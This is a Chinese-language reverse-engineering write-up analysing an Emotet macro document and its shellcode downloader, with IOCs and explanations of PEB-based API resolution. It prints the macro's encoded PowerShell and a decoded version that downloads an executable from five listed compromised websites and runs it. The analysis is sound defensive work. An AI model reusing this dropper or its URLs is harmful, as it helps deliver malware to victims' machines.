0x00 前言：
========

Emotet银行木马首次发现是在2014年6月份，其主要通过垃圾邮件的方式进行传播感染目标用户，变种极多。

这次获取的样本分为三个阶段，宏文档——&gt;下载器——&gt;窃密程序，由于篇幅和最后的窃密程序还没分析完的原因，这里只给出前两个阶段的分析文章，最后的窃密程序在写完后会以（二）的形式同样在奇安信攻防社区发布。

0x01 样本分析：
==========

样本运行流程：
-------

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-489897f544641139d022598e2a97d746b1c308a0.png)

恶意宏文档：
------

### IOC：

| HASH | 值 |
|---|---|
| SHA256 | 1c3afd309d4861152d2c543ca46a7bb052901bdfd990b5c07e1cab509aab9272 |
| MD5 | d80d1322b4be9f19cb8efa7ecada7351 |
| SHA1 | be9efb37ebba29888e1e6451cc6294bde8c30d04 |

### 沙箱分析链接：

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/1c3afd309d4861152d2c543ca46a7bb052901bdfd990b5c07e1cab509aab9272)

### 起始行为分析：

打开文档，文档中内容诱惑用户启动宏。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-8d09dcdb4ba57b82ea65dfdf8209bd17a88d2d5b.png)

### 查看宏代码：

进入VBA中查看宏代码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-b1e9e46a946c6fcc1adf69aba0e5b8d0c0efc371.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-42f8daa197669b82d01079705fe224ad5ae41884.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-774e528bb4972b75d80be78f72a7c5ccda9dfb25.png)

### 提取并解密 powershell 代码：

通过解密后的代码可以看到该 pwershell 会遍历预定的四个网址列表下载恶意程序并重命名为 296.exe，然后启动进程来执行。

```powershell
JABTAG8AbgBsAGYAbQB4AGYAZwBsAGcAPQAnAFgAeQB5AHMAbgBrAGkAdQB5AHgAbwAnADsAJABFAGMAegBhAGQAeAB2AGUAYwAgAD0AIAAnADIAOQA2ACcAOwAkAFoAegByAHIAegBlAGIAeQBzAGUAPQAnAFYAcAB5AGIAeAB4AHAAbQBkAGUAeQBkAHEAJwA7ACQATQB3AGIAZwBvAHIAaAByAHkAZgBoAG4AZQA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQARQBjAHoAYQBkAHgAdgBlAGMAKwAnAC4AZQB4AGUAJwA7ACQAUwB1AHIAegBkAHgAZAB5AGcAcAB0AGgAPQAnAFkAZgB1AGYAbgBwAHMAdwB4AHoAJwA7ACQATAB2AGIAbwBqAG8AbAB4AHYAeABtAD0ALgAoACcAbgBlAHcALQBvAGIAJwArACcAagAnACsAJwBlAGMAdAAnACkAIABOAEUAdAAuAHcARQBiAGMAbABJAGUATgBUADsAJABGAHYAbwB2AGEAZABzAGgAaAB0AGIAbwA9ACcAaAB0AHQAcAA6AC8ALwBhAGQAeQBrAHUAcgBuAGkAYQB3AGEAbgAuAGMAbwBtAC8AbQBwADMALwAxADgAbwB4ADYAaAAvACoAaAB0AHQAcAA6AC8ALwBtAHkAcABoAGEAbQB0AGgAYQBuAGgAYgBpAG4AaAAuAG4AZQB0AC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHUAcABsAG8AYQBkAHMALwBxAEQAcQAvACoAaAB0AHQAcAA6AC8ALwBzAGYAbQBhAGMALgBiAGkAegAvAGMAYQBsAGUAbgBkAGEAcgAvAEsAMQBhAC8AKgBoAHQAdABwADoALwAvAHcAdwB3AC4AbQBqAG0AZQBjAGgAYQBuAGkAYwBhAGwALgBjAG8AbQAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAGQAZAB5AC8AKgBoAHQAdABwADoALwAvAG0AbwBqAGUAaABhAGYAdABvAG0ALgBjAG8AbQAvAHcAcAAtAGEAZABtAGkAbgAvADEAMwA3ADQAeAB2AC8AJwAuACIAcwBgAHAATABpAHQAIgAoACcAKgAnACkAOwAkAFYAZwB1AGIAbgBiAGgAbABpAGUAYgBlAD0AJwBTAHIAcwBtAGQAcQBpAGEAJwA7AGYAbwByAGUAYQBjAGgAKAAkAFEAdABzAHcAegBnAGYAcwBrAGkAagAgAGkAbgAgACQARgB2AG8AdgBhAGQAcwBoAGgAdABiAG8AKQB7AHQAcgB5AHsAJABMAHYAYgBvAGoAbwBsAHgAdgB4AG0ALgAiAEQAYABvAHcAbgBsAGAAbwBhAGAAZABmAEkATABFACIAKAAkAFEAdABzAHcAegBnAGYAcwBrAGkAagAsACAAJABNAHcAYgBnAG8AcgBoAHIAeQBmAGgAbgBlACkAOwAkAEQAeQBjAGMAYQB3AHcAcgBqAG0AYgB3AGUAPQAnAFMAegB2AGQAdQBlAHAAdwAnADsASQBmACAAKAAoACYAKAAnAEcAJwArACcAZQB0ACcAKwAnAC0ASQB0AGUAbQAnACkAIAAkAE0AdwBiAGcAbwByAGgAcgB5AGYAaABuAGUAKQAuACIAbABlAGAATgBnAHQASAAiACAALQBnAGUAIAAyADkAMQA3ADcAKQAgAHsAWwBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6ACIAUwB0AGAAQQByAHQAIgAoACQATQB3AGIAZwBvAHIAaAByAHkAZgBoAG4AZQApADsAJABEAGwAdwB6AGoAdgBiAHYAPQAnAFkAZgBsAG0AaABqAHYAdwBhAHYAbQAnADsAYgByAGUAYQBrADsAJABMAHEAbQB4AGoAdQBuAGMAcgBmAD0AJwBMAHYAagBjAGcAdgBpAGgAbAB1AHUAawAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABWAHUAegBsAGIAbwBxAGEAawBqAHcAPQAnAEIAagBuAGgAegBtAHQAdgBuAGwAdQB0ACcA
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-99bb56e2147327cf334f562bf7f6bb80202ba947.png)

```php
$Sonlfmxfglg='Xyysnkiuyxo';
$Eczadxvec = '296';$Zzrrzebyse='Vpybxxpmdeydq';
$Mwbgorhryfhne=$env:userprofile+'\'+$Eczadxvec+'.exe';
$Surzdxdygpth='Yfufnpswxz';
$Lvbojolxvxm=.('new-ob'+'j'+'ect') NEt.wEbclIeNT;$Fvovadshhtbo='http://adykurniawan.com/mp3/18ox6h/*http://myphamthanhbinh.net/wp-content/uploads/qDq/*http://sfmac.biz/calendar/K1a/*http://www.mjmechanical.com/wp-includes/ddy/*http://mojehaftom.com/wp-admin/1374xv/'."s`pLit"('*');
$Vgubnbhliebe='Srsmdqia';
foreach($Qtswzgfskij in $Fvovadshhtbo)
{
    try
        {
            $Lvbojolxvxm."D`ownl`oa`dfILE"($Qtswzgfskij, $Mwbgorhryfhne);
            $Dyccawwrjmbwe='Szvduepw';

            If ((&('G'+'et'+'-Item') $Mwbgorhryfhne)."le`NgtH" -ge 29177)                               {
                    [Diagnostics.Process]::"St`Art"($Mwbgorhryfhne);
                    $Dlwzjvbv='Yflmhjvwavm';
                    break;
                    $Lqmxjuncrf='Lvjcgvihluuk'
                }
        }
    catch{
            }
}
$Vuzlboqakjw='Bjnhzmtvnlut'
```

**恶意 Downloader：**
------------------

### **IOC：**

| hash | 值 |
|---|---|
| MD5 | 0f973d998083c92b8863f62ae6a93ac0 |
| SHA256 | be403ce2d14f38b66528d438457927218f1aa44a68530bf46b2703da75dcc8bd |
| SHA1 | d27590b402b475ae11a93f2976c2de595ab1eac9 |
| SHA512 | 04711f777ad181eca49afc9314438d492fa5a46b0ddbe1c4001b27bede07ad732806603a56ee320249e379c9af0865ddbf65d51e09e8ede9d06ff13668379a52 |

### 沙箱分析链接：

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/be403ce2d14f38b66528d438457927218f1aa44a68530bf46b2703da75dcc8bd)

### 起始行为分析：

样本一上来先进行注册表操作，打开关闭以下注册表项，也许是干扰行为分析：

Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer

Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Network

Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Comdlg32

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-ddb82dac0915ffe5ae17587a78d1ecead21e61da.png)

#### 动态获取 export\_function 手法一：get\_funbase

这里配合上面 LoadLibraryW 函数加载的 CRYPT32.DLL 动态获取导出函数以供后续使用，具体手法我后面会分析：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-4f2f8aef543c79c8de25a71c98806813f4d9858b.png)

#### 动态获取 dll\_base 手法一：get\_dllbase

同样的大量动态获取所需函数地址，get\_funbase 和前面那个是一样的，不同的是这里获取 DLL 基址也是动态获取的，这里命名为 get\_dllbase，具体手法也会在后面一起分析。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-6c120f261943be0c9fab043a6c11cb4bacd23016.png)

#### 抽取资源中恶意代码进行投放

获取紧接着调用上面动态获取到的函数，获取 SPOOFER 资源中嵌入的加密恶意代码，这里是执行了投放器的功能。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-d5ac26ebd3b64a4a985d70d3f7a98281eb06d917.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-5eb6f1033d300c327d6e0fedb82287e7ed272a0a.png)

紧接着是大量但是简单的 SendMessage 干扰混淆代码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-a7d9e2a086137cc6fc7223a44a3721a0ac2329a8.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-4d03919f3c5cae036fec1f2eb905583947da3524.png)

#### 申请内存空间，填充第一层和第二层 shellcode

锁定线程，开辟空间，填充前面从资源处释放的未解密恶意代码和解密用的数据，解密得到第一层 shellcode

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-64ad1e9930df2d02e70d4909e3ccc86cb61be487.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-25ad28739979bef1a8c3e270d028768e6aea2b02.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e2f85022c24b3b41d3d9f5ed33e25c5cd3f62277.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-3f141c8dffe3e938c6a34442c9c261e73475ef2c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-12a4dedab5a83abf0df1a8a4decf142a6b1919f4.png)

异或解密代码原理分析：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-bfaef120749a762dd66cf04fc675c4b24591114d.png)

### 第一层 ShellCode 分析

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-83d9d9c3c5fb7cd7faa0bfe7a98c3bb9aa908c9c.png)

#### 加载 CryptoAPI 加密相关函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-f2d385d6ac61701a9c85ac0fe9770b85a8ccd2b6.png)

#### 动态获取手法二：get\_funbase2 和 load\_dll

代码先获取 ADVAPI32.DLL 中加密相关的 CryptAPI 函数，这里也用到了动态加载 DLL 和动态获取导出函数 load\_dll 和 get\_funbase2，因为获取手段不一样，所以我们和前面的手法一区分开来，具体行为也在后面分析。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-19449327298058e0f2d5f3720580ed6a8211da24.png)

#### 干扰代码——空加密

前面加载了一些 ADVAPI32.DLL 的 CryptoAPI 加密函数，但是后面进行了空数据加密来干扰分析：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-832dc798ef8b90314d98a00a3e20c6b5f439188e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-f42b112644470d726de6e8be53ba4208a527a577.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-a65adf356374a747d3ac22b002bd187753f1a486.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-d966829938c268155fea9b898705e6d30d1ca5ef.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-2cd7800a84df791438adeed1277c7663acc54cb0.png)

### 第二层 ShellCode 分析

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-2b120a4ee667606243ebb0d2f521b73c8132a924.png)

#### 动态获取手法三：get\_funbase3

第二层 shellcode 用特定函数名的 hash 搭配动态获取函数获取需要其函数地址：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-ca876ffef028bfe8ad883d8e03a6c29b67527f8d.png)

#### 申请内存空间，填充第三层 ShellCode

然后利用这些函数进行获取计算机信息、申请页面空间并修改其访问权限、清除指令缓存等操作，其中申请的内存空间为第三层 ShellCode 空间，并向里面填充好了数据代码。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e1f53adde18b4e564d98be3bcef0b71d2fc11291.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-2897fb49c5c0d696b0cd448863e5f6f49d551a27.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-3180303a4e3db15bb58e0e3157b9de160bbe751d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-14dd879ccde3d4413609e8546e693776221c9a75.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-44b3e18672b2d9a0c8496f7f0cd1d0b8d80f277f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e6ecbf76259c607183fd6d3ecdf2d70400ea8c7f.png)

### 进入第三块申请的内存中

#### 预定义函数 Hash

第三块内存一开始就把一大堆由函数名计算的 HASH 存放起来用于后面动态获取，能很好地干扰杀毒软件分析。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-1bbd1d5f1759cb5d64fa22a8ed11e7474667225c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e98a1c20d557b6a28464f313098d840604f0f56e.png)

#### 动态获取手法四：match\_hash\_funaddress 和 get\_dllbase4

第三层 shellcode 用特定函数名的 hash 搭配动态获取函数获取需要其函数地址并压入对应地址空间中以备后续使用。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-152bc5768385ee15ba370d65a65fb21a8f037091.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-a0ec28b0770d7183a356ac6d26f904a8b2057dd8.png)

#### 对比命令行参数

黄框是上面动态获取特定 DLL 和其内特定 HASH 匹配的函数地址，分别调用了两次用于获取 ntdll.dll 和 kernel32.dll 对应的 hash 函数地址。

然后调用这些函数地址获取当前进程路径和命令行信息，并与预定义参数进行对比，如果对比不上就启动带有预定义参数的进程并退出当前进程。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-4e16b3e758d47e680a40b77dd56b0b4d7acaba15.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-4a2ed3df83867844a4c5ca128d3a0b19bbb5e728.png)

### 设立对应参数后继续跟踪

#### 检索当前目录信息

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-47f7855b76a94fba8f569387d940bee41d734bf4.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e80f8dfbe5b3e89d25b3c9eb37a37170465b02df.png)

#### 计算目标系统目录并复制文件

车给你需先计算文件 CRC，然后检索系统信息并计算生成对应系统目标目录，接着把文件复制到指定目录下并重命名为deployacquire.exe 来干扰用户和杀软判断，最后删除当前文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-15e98b23979670d47e9ff5f602e4909ea51c436a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-04abc2454fdfb4eae111959fe194a42ca349c9ab.png)

### 复制到系统目录后继续跟踪

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-1934608a59ea3d5a98f3045c5ebab77eb01ef332.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-a84a797432c5d3dfaeaf646470bd6072f02b5d66.png)

#### 连接恶意链接

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-f8722846ee5c2fb58bbf98a116aeb8766088d49c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-10183d321e0df9ec2c56af88841b09d345c753a2.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-41122ba391f4482c838b2a900a0865b59648b544.png)

#### 写入文件并启动进程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-9edf17ef8f8132da80f768aead26e09173ad43b2.png)

上面那幅图是总览，跟进去后调用的函数如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-73b3ce6079f943a569c58982dcfbc73a0281fc78.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-4aec9bae6f6362711a18d711c933cab53ffa658b.png)

### 动态获取手法分析

#### 动态获取 dll 和函数地址手法一

##### get\_funbase

在《Windows PE权威指南》第 161 的根据名字查找函数地址的行为一样。

> 步骤1 定位到 PE 头。
> 
> 步骤2 从 PE 文件头中找到数据目录表，表项的第一个双字值是导出表的起始 RVA。
> 
> 步骤3 从导出表中获取 NumberOfNames 字段的值，以便构造一个循环，根据此值确定循环的次数。
> 
> 步骤4 从 AddressOfNames 字段指向的函数名称数组的第一项开始，与给定的函数名字进行匹配; 如果匹配成功，则记录从 AddressOfNames 开始的索引号。
> 
> 步骤5 通过索引号再去检索 AddressOfNameOrdinals 数组，从同样索引的位置映射找到函数的地址(AddressOfFunctions)索引。
> 
> 步骤6 通过查询 AddressOfFunctions 指定函数地址索引位置的值，找到虚拟地址。
> 
> 步骤7 将虚拟地址加上该动态链接库在被导入到地址空间的基地址，即为函数的真实入口地址。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-7a36bf9e4a7eaf663d903e7ffc083316cf9486cf.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-3f95e707128880886c58aab5cd9b834dd6a2a006.png)

##### get\_dllbase

根据 PEB 结构特征遍历获取 DLL 基址，并调用大写转换函数来匹配 DLL 名字。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-285dd850efdc4cd79053f0194e5023bfeb444f4f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-1af8403a4db64a7b31247fb6aac38bc36fe3c9d7.png)

遍历 PEB 的原理，此图引用自：[PEB结构：获取模块kernel32基址](https://bbs.pediy.com/thread-266678.htm)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-2442bd9dff8abeab6a6c0fe2f488409598392c1e.png)

#### 动态获取 dll 和函数地址手法二

##### get\_funbase2

这次手法与上次不同的是，他把 get\_dllbase 和 get\_funbase 功能合在了一起，传入的参数是一个函数名字符串。该函数先遍历 PEB 结构的 InLoadOrderModuleList 模块获取 DLL 基址，然后再以遍历中的 DLL 基址内嵌一层按照函数名遍历导出表寻找导出函数的循环，以此来传入的需要的函数名字符串的地址。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-fb2ee4f329765f019f7b322da3e8ed473272c6b1.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-d78fff848d4c91ff1e8e02c9ce2054b2437ac7e3.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-0ac4057af96ac9fdb7d1ce770c2cb769e0347afb.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-7c694e821b3040d379995e70c19656f14f8dc4c3.png)

##### load\_dll

这里其实只是简单地调用函数加载对应的 dll 而已，并不是动态获取，主要逻辑都在上面 get\_funbase2 中。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-921daa0aa82bbd71dfb9e089a9a38ead3c7e7614.png)

其中 LdrLoadDLL 函数参数参考：[ldrloaddll的参数问题](https://bbs.pediy.com/thread-204921.htm)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-ec390ba7c33dd14160fd57d14f5ba7ce87f2e90d.png)

#### 动态获取函数地址手法三

##### get\_funbase3

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-267f3dc9fd9ccaa07d133af052ea73be4e56cbd0.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-7a3c18c23679d07254118a8683928da9c51c9814.png)

#### 动态获取 dll 和函数地址手法四

##### match\_hash\_funaddress

跟着注释走吧~

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-20355ab86a10ca7576745046e1e44573dee58e8c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-730c470322d330061cf53e5aecd4f78533539c4e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-9439334deab116e9c2cc16e8158897b8bd07d612.png)

##### get\_dllbase4

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-1c9a23d41ac8c23a3abd4b415de7f029fd6a5fbf.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-8df4539f7c3d3a9d84abc684f5feb91f928ec9d9.png)

#### 动态获取手法总结

该样本用了四种不同的动态获取方式，其大致可分成两类：

第一类直接通过 PEB 结构动态获取导出函数地址。

第二类给出特定 HASH ，在动态获取函数地址中同时计算其 HASH 值来匹配

显然第二种目的性更强，干扰性和迷惑性也更大。

0x02 恶意样本总体分析
=============

从火绒实验室的 [层层对抗安全软件 火绒对Emotet僵尸网络深度分析](https://bbs.pediy.com/thread-267282.htm) 中我们可以对比出此次 downloader 混淆器是 Emotet 家族的第二阶段，利用的是**多层shellcode注入加载 + 环境检测**。

> 这个阶段的混淆器总共有3层，外层的MFC混淆器解密执行第二层shellcode， 第二层shellcode解密执行第三层shellcode，第三层shellcode检测执行环境（检测虚拟机，沙箱，关闭微软防火墙服务等）并将最终的PE以创建新进程注入的方式加载执行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-04e7b37751d8c65d04d66b985eab857aafb4c134.png)

0x03 最后
=======

这是我分析的第一个 APT 家族的样本，因为技术不够，所以其实很多行为没有分析出来，像互斥体、卷影、堆行为、控制流平坦化这些。很多代码执行和数据等都有前因后果的，但是同样的原因可能忽视掉了。

其实在大量的无效代码和混淆代码下我都不知道哪些数据处理是有用哪些是没用的了，一开始的时候我慢慢分析的时候能梳理一二，到了后面发现程序很大很大，调了好久好久，调到真的乱了，就。。。。。

紧接着恶意 downloader 还下载了一个窃密程序，由于篇幅和时间原因暂时没放上来，等我分析完后同样会在奇安信攻防社区中以第二篇展示出来。

上面分析中如有错误还请指正。

0x04 参考
=======

[\[原创\]层层对抗安全软件 火绒对Emotet僵尸网络深度分析-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-267282.htm)

[\[原创\]PEB结构：获取模块kernel32基址技术及原理分析-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-266678.htm)

[新变种Emotet恶意样本分析\_PwnGuo的博客-CSDN博客\_emotet样本分析](https://blog.csdn.net/qq_37431937/article/details/121789915)

[EMOTET深度分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5436)

[Emotet银行木马分析\_Iam0x17的博客-CSDN博客\_emotet木马](https://blog.csdn.net/weixin_44001905/article/details/104549666)

[\[原创\]Emotet病毒分析-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-264277.htm)

[如何调试Word宏病毒，以及使用VS调试VB脚本\_FFE4的博客-CSDN博客](https://blog.csdn.net/cssxn/article/details/83855541)

[Emotet银行木马分析报告 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/terminal/180390.html)